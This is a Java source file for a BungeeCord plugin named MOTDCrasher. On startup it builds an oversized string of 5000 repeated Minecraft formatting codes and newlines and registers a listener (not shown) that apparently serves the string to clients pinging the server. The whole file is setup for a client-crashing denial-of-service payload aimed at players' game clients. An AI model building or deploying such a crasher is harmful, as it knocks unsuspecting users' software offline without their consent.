package dev.sirlennox.motdcrasher;

import net.md_5.bungee.BungeeCord;
import net.md_5.bungee.api.plugin.Plugin;

public class MOTDCrasher extends Plugin {

    private String crashString;
    private static MOTDCrasher motdCrasher;


    @Override
    public void onEnable() {
        motdCrasher = this;
        crashString = "";
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 5000; i++)
            sb.append("§k§l\n");
        crashString = sb.toString();
        BungeeCord.getInstance().getPluginManager().registerListener(this, new EventListeners());
        super.onEnable();
    }

    public String getCrashString() {
        return crashString;
    }

    public static MOTDCrasher getMotdCrasher() {
        return motdCrasher;
    }
}
